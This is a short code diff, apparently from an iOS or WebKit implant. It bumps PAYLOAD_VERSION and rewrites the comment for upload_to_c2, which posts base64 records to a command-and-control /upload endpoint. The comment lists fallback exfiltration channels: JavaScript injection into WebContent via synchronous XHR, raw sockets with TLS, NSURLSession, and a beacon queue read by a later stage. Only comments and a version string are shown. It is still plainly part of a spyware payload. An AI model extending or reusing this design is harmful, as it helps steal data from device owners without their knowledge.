@@ -13,7 +13,7 @@
  * behaviour so the operator can confirm which version is running on-device.
  * Format: "<major>.<minor>".  Major = breaking change, minor = incremental.
  */
-#define PAYLOAD_VERSION "1.8"
+#define PAYLOAD_VERSION "1.10"
 
 /*
  * upload_to_c2 — HTTP(S) POST one record to the Go /upload endpoint.
@@ -23,7 +23,7 @@
  *   b64data     : base64-encoded payload bytes
  *
  * Upload channel priority (each falls back to the next on failure):
- *   C — JSContext fetch() injection (WebContent JS thread / saved context)
+ *   C — JSContext injection (sync XHR in WebContent / saved context)
  *   B — raw POSIX socket + SecureTransport TLS
  *   A — NSURLSession (blocked in WebContent, used outside WebContent)
  *   D2 — window.__d1_q push via JSContext (upload_beacon only); Stage3 reads
